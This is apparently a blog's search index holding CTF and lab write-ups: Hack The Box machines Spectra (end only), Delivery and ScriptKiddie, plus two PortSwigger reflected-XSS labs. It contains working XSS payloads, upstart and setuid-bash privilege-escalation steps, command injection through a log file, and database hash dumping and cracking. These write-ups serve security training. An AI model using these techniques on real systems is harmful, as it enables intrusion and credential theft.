2020 test10.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test2.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test3.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test4.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test5.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test6.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test7.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test8.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test9.conf-rw-r--r-- 1 root root 2645 Dec 22 05:53 tlsdated.conf-rw-r--r-- 1 root root 1276 Dec 22 06:10 tpm-probe.conf-rw-r--r-- 1 root root 673 Jan 15 15:33 tpm_managerd.conf-rw-r--r-- 1 root root 696 Jan 15 15:35 trace_marker-test.conf-rw-r--r-- 1 root root 667 Jan 15 15:35 tracefs-init.conf-rw-r--r-- 1 root root 1124 Jan 15 15:35 trim.conf-rw-r--r-- 1 root root 622 Jan 15 15:33 trunSome of the files are writable by the *developers group. Katie is also part of this group, as we can see from the output of the id command.katie@spectra /etc/init $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)So we can replace one of the writable conf file with a malicious one.First we stop the servicesudo /sbin/initctl stop testWe can then modify the upstart script and escalate our privileges to root.Malicious content of the new test.conf:description &quot;Test node.js server&quot;author &quot;katie&quot; start on filesystem or runlevel [2345]stop on shutdownscript cat /root/root.txt &amp;gt; /tmp/flagend scriptWe start the servicesudo /sbin/initctl start testWe can now retrieve the filekatie@spectra /etc/init $ cat /tmp/flagd44519713b889d5e1f9e536d0c6df2fc(Then we remove our flag file from /tmp to avoid that other people get an easy root flag).In case we want to get a proper root shell, the content of the test.conf may be:description &quot;Test node.js server&quot;author &quot;katie&quot; start on filesystem or runlevel [2345]stop on shutdownscript chmod +s /bin/bashend scriptThen: /bin/bash -p." }, { "title": "PortSwigger Labs - Reflected XSS with event handlers and href attributes blocked", "url": "/posts/Reflected-XSS-blocked-events-and-href/", "categories": "PortSwigger-Labs", "tags": "xss, reflected-xss, svg", "date": "2021-06-23 11:50:00 +0200", "snippet": "DescriptionLab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked WriteupSo event handlers and href attribute are blacklisted.Let’s use Burp intruder to see whether we have any tags that we can use. We can take the complete list of html tags from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet.Some of the whitelisted tags are svg, animate and a. We can use them to our advantage and easily trigger our javascript.In particular we exploit the animate tag and its attributeName attribute. Such attribute specifies the name of the CSS property or attribute of the target element that is going to be changed during an animation.So, by specifying href as the value of attributeName we can manipulate and assign values to the href attribute without being blocked.We can craft our XSS payload: &amp;lt;svg&amp;gt;&amp;lt;a&amp;gt;&amp;lt;circle r=&#39;400&#39; /&amp;gt; &amp;lt;animate attributeName=href values=&quot;javascript:alert(1)&quot;&amp;gt;&amp;lt;/a&amp;gt; The XSS is indeed working but it is not pretty enough. The challenge wants us to provide a clickable link that the unsuspicious victim could fall for.We can easily do it by replacing the circle tag with the SVGtext element.The payload is now: &amp;lt;svg&amp;gt;&amp;lt;a&amp;gt;&amp;lt;text x=&quot;20&quot; y=&quot;35&quot; class=&quot;small&quot;&amp;gt;Click here&amp;lt;/text&amp;gt; &amp;lt;animate attributeName=href values=&quot;javascript:alert(1)&quot;&amp;gt;&amp;lt;/a&amp;gt;And now the XSS is way smoother. Still not that pretty but enough to pass the challenge. Clicking it will trigger the XSS " }, { "title": "PortSwigger Labs - Reflected XSS into HTML context with all tags blocked except custom ones", "url": "/posts/Reflected-XSS-on-custom-tag/", "categories": "PortSwigger-Labs", "tags": "xss, reflected-xss, custom-tags", "date": "2021-06-23 10:40:00 +0200", "snippet": "Reflected XSS into HTML context with all tags blocked except custom onesDescriptionLink: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked WriteupThe value of the search parameter is reflected in the response. So, let’s test whether the input is not properly sanitized/escapade.All tags are blacklisted except the custom ones. We can try to inject our own tag and trigger the payload on the onfocus event.The custom tag and attributes are: &amp;lt;exploit id=x onfocus=alert(document.cookie); tabindex=1&amp;gt;.The content of the file visited by the user to trigger our XSS is:&amp;lt;script&amp;gt;location = &quot;https://acca1f861ec66b0381e0022700040079.web-security-academy.net/?search=&amp;lt;exploit+id%3dx+onfocus%3dalert(document.cookie);+tabindex%3d1&amp;gt;#x&quot;;&amp;lt;/script&amp;gt;The user will be redirected to the vulnerable page and the #x will make the page focus on our custom tag, triggering the alert pop-up." }, { "title": "Hack The Box - Delivery Writeup", "url": "/posts/Delivery/", "categories": "Hack The Box, Machines", "tags": "custom-exploitation, mysql, hashcat", "date": "2021-06-09 18:12:00 +0200", "snippet": "Start with usual nmap enumerationnmap -sC -sV -oN nmap-initial 10.10.10.222Port 22 and 80 open where an nginx server is listening.We visit the service on port 80. The page contains links to 2 different domain name, namely helpdesk.delivery.htb and delivery.htb. We add them in our /etc/hosts file so that we can access them.FootholdAs described in the main page of delivery.htb we cannot access the Mattermost server if we don’t have a delivery.htb account. The helpdesk server seems the first place we should look at. We start by poking around in the helpdesk servrer. We open a ticket and we get the following response messagezed, You may check the status of your ticket, by navigating to the Check Status page using ticket id: 9756656.If you want to add more information to your ticket, just email 9756656@delivery.htb.Thanks,Support TeamIf we move to the Check Status tab we can see the status of our ticket but nothing more than that.The first idea is to create a new delivery.htb account in the helpdesk server. However, once the registration completes, the account is locked until we confirm the sign in process through a verification email. A verification email that will obviously never arrive because the HTB machines do not talk to the internet.As a second idea we play with the osTicket api with the purpose of bypassing the verification of the account. This road is also a rabbit hole though.The third idea is instead the successful one. We can visit the mattermost server and create an account. It again asks for a confirmation email if we want to finalize the registration. While the problem with the verification email is still the same we had before, we can now find a smarter way to keep the verification email inside of the HTB network. By looking closer at the previous response, namelyIf you want to add more information to your ticket, just email 9756656@delivery.htb.we suspect that each email sent to 9203128@delivery.htb will add information to the ticket, thus showing them in our Check Status tab.So, we create the account in the mattermost server with the email 9756656@delivery.htb, the content of the verification email will be visible in our Check status tab as supposed.We follow the link in the email and we can login to the MatterMost server.Once logged in we can retrieve the credentials for the server maildeliverer:Youve_G0t_Mail!. We try them in ssh and yes, they are correct!.We get in and we have the user flag. It’s time now to go for root.RootWe can enumerate the victim machine using linpeas.Interesting stuff from linpeas’ report * * * * * root /root/mail.sh binary permissions 85M -rwxrwxr-x 1 mattermost mattermost 85M Dec 18 08:53 /opt/mattermost/bin/mattermost `root 908 0.0 0.4 29544 18336 ? S 10:27 0:00 python3 /root/py-smtp.py’Nothing that we can exploit though.The /opt directory is very interesting because it usually contains user programs. It’s very likely to configuration files with hardcoded credentials or useful info.config.jsonThis is an extract of the config.json file inside the mattermost directory under /opt1.&quot;EnableGifPicker&quot;: true,&quot;GfycatApiKey&quot;: &quot;2_KtH_W5&quot;,&quot;GfycatApiSecret&quot;: &quot;3wLVZPiswc3DnaiaFoLkDvB4X0IV6CpMkj4tf2inJRsBY6-FnkT08zGmppWFgeof&quot;,2.&quot;DriverName&quot;: &quot;mysql&quot;,&quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s&quot;,&quot;DataSourceReplicas&quot;: [],&quot;DataSourceSearchReplicas&quot;: [],&quot;MaxIdleConns&quot;: 20,&quot;ConnMaxLifetimeMilliseconds&quot;: 3600000,&quot;MaxOpenConns&quot;: 300,&quot;Trace&quot;: false,&quot;AtRestEncryptKey&quot;: &quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;,&quot;QueryTimeout&quot;: 30,&quot;DisableDatabaseSearch&quot;: falseSo we have 2 interesting things to look at. The first one is not sensible info though. Those are just the default api keys to select GIfs through the emoji picker.The second one is instead more interesting. We have in fact an username and a password for a mysql database.We thus try to connect to the mysql database: mysql -u mmuser -p. Obviously the password is Crack_The_MM_Admin_PW.Once we are in we take a look around, we enter the mattermost database (use mattermost) and we dump the valuable columns of the Users table.MariaDB [mattermost]&amp;gt; select username,password,email,position,roles from Users;+----------------------------------+--------------------------------------------------------------+----------------------------------+----------+--------------------------+| username | password | email | position | roles |+----------------------------------+--------------------------------------------------------------+----------------------------------+----------+--------------------------+| redd | $2a$10$hKlb3XSk3jjLPd77EFtdCOM1W9NbHxZoOvaJ/oXED6Pk8ni44PGFq | 9050912@delivery.htb | | system_user || lukaspre01 | $2a$10$.qWymcm5r70PPx7M1ft4Ce2IYcizXWVbI5Uf6CYKLLtDurQC.h1LK | a@a.a | | system_user || surveybot | | surveybot@localhost | | system_user || c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | 4120849@delivery.htb | | system_user || 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | 7466068@delivery.htb | | system_user || vik0nd | $2a$10$Xvpuik3uk89i5BXNL.e0YesORDU3Zkq8EdNuDOjHxomo9.nFydq7S | vik0nd@delivery.htb | | system_user || mario | $2a$10$XxiqFPPGPcsN/69AAEhWIOOAYBomsGUxgQ2vsxVlcwO4vGUvJNbx. | 300065@delivery.htb | | system_user || visiter | $2a$10$p2haD2QwKc/a2whVopP.be5/kzD9j9Hidjz84PXZCZt5uL5Fh.8XS | 4808841@delivery.htb | | system_user || root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | root@delivery.htb | | system_admin system_user || ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | 9122359@delivery.htb | | system_user || kr01lap1324 | $2a$10$RKyOCA.5z/qlrRv9lUMpwOrML.RSfNR3qULV.xhURSZV9Q0zdEUWm | fvfmbadwiqmvnazjmp@upived.online | | system_user || channelexport | | channelexport@localhost | | system_user || 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | 5056505@delivery.htb | | system_user || test | $2a$10$qvQsc6MM7HCKfU8biKfUlOloiaDqKAB5Jt7rWMZAP1pS1PV94lUFa | test@test.test | | system_user || lukaspre0 | $2a$10$2pbXtl5L.CcdxOMgLVV1iedACIN6vlxPQWGkP9YFebhz/icHS.fw6 | hogin71087@zefara.com | | system_user || cha | $2a$10$cBEzQzkYyPip0qOWijE3L.53Igq2KllSXfm7wwLf901Vf1GWlsRNi | 2061649@delivery.htb | | system_user |+----------------------------------+--------------------------------------------------------------+----------------------------------+----------+--------------------------+16 rows in set (0.001 sec)The dump shows a dozen of usernames and hashes. Part of the accounts have been created by other HTB player when registering to the mattermost server.We take the root hash and we give it to hashcat. As highlighted by the chat in the mattermost server we saw before, the candidate password is a variation of PleaseSubscribe!.Thus we try to crack the hash keeping this in mind.We take ‘PleaseSubscibe!’ and we try its variations using the hashcat rules. There is no need of writing personal rules since hashcat provides some of the most common rules for password cracking. In kali Linux they are stored under /usr/share/hashcat/rules/.&amp;gt; hashcat -a 0 -m 3200 hash pass -r /usr/share/hashcat/rules/bes t64.rule...$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21...Cracked the hash, we can login as the root user: su - with password PleaseSubscribe!21The root flag is there waiting for us." }, { "title": "Hack The Box - ScriptKiddie Writeup", "url": "/posts/ScriptKiddie/", "categories": "Hack The Box, Machines", "tags": "wfuzz, known-exploit, metasploit", "date": "2021-06-06 10:12:00 +0200", "snippet": "Start with usual nmap script to enumerate.nmap -sC -sV -oN nmap-initial 10.10.10.226We see ssh open, a fitered 903 port and a webserver on 5000.We start by looking at port 5000. As we see from the nmap outcome, port 5000 hosts a Werkzeug web application which uses python 3.8.5Run dirbuster: http://10.10.10.226:5000/, not recursive, extentions: py,html, dictionary mediumRun dirbuster: http://10.10.10.226:5000/, not recursive, extentions: py,html, dictionary dirb big.txtRun wfuzz to find console entry. Namelywfuzz -u http://10.10.10.226:5000/FUZZ/console -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404No results excepts //console that returns the default pageIdeas: May contain sensitive information ?http://10.10.10.226:5000/static/hacker.css fuzz url to find console e.g. http://10.10.10.226:5000/$FUZZ$/console Access /console or trigger internal server error to make the console show uphttps://medium.com/swlh/hacking-flask-applications-939eae4bffedThe more promising so far is tryng to trigger an internal server error.Path 1: Trigger internal state Change values of os in the payload fieldSince the user is limited to select the values linux,windows or android, the back end may give the selection of one of this 3 possibilities for granted. We thus try to modify the http payload with Burp, hoping to cause an internal error in the server.We tried with names such as ‘lll’ or also special charachters as &#39;,&quot;,*. Invalid os is returned by the back end. Trigger internal state error by using a malformed msfvenom template fileDid not yield to any resultsPath 2: Command injection in msfvenom template fileWhile googling for information regarding the template file and msfvenom, we run into the CVE-2020-7384: Malicious user may upload a malicious template file in msfvenom which would trigger code execution on the target machine.Metasploit created a module for this vulnerability as we can see from the metasploit github page: https://github.com/rapid7/metasploit-framework/pull/14331.We thus use metasploit to exploit the vulnerability (the module is pretty new, so we need to update metasploit if the module is not available)We select the module (unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) , modify the options and we run the exploit. This will generate the apk file containing our command injection that will be executed by msfvenom on the target machine.We start a exploit/multi/handler on our host mahcine and upload the generated apk file in the specific form in the web server. The os which has to be selected is android, the ip can be arbitrary.Once we press generate a reverse shell will be started on the metasploit handler instance.The user flag is under /home/kid.We now want to escalate the privilegesWe see a scanlosers.sh in the /home/pwn directory that we can read. After a quick analysis of the file it is possible to see that the file /home/kid/logs/hackers is used to retrieve inputs to feed to scanlosers.sh.Given that we (as kid) own the the file ‘hackers’, we may inject some command in the file and hope that it will be executed by the pwn user.We can confirm that scanlosers.sh is in action by writing to the ‘hackers’ file. As we can see, the file get emptied immediately.We can easily execute command in scanlosers.sh by using nested commands. Namelyecho &#39;ciao1 ciao2 $(/usr/bin/ping 10.10.14.20)&#39; &amp;gt;&amp;gt; hackersWe receive the ping in the host machine, thus confirming the code injection.With a better payload:echo &#39;ciao ciao $(cp /bin/bash /home/pwn/bash; chmod +s /home/pwn/bash)&#39; &amp;gt;&amp;gt; /home/kid/logs/hackersWe execute the bash shell with the -p option. The effective user id will be used../bash -pWe are now the user pwn.We set up the ssh keys to enter through ssh and have a more stable shell. Since the authorized file is owned by root and we cannot overwrite it, we remove the entire .ssh folder and we create another one. We insert our pub key in the authorized file and we connect through ssh.We can then proceed to root the box.With sudo -l we can see that the user pwn can execute msfconsole as root. Again we can use the script kiddie tools against him.sudo /opt/metasploit-framework-6.0.9/msfconsoleWe thus get the shell as rootmsf6 &amp;gt; whoami[*] exec: whoamirootWe can now retrieve the flag in /root/root.txt" } ]
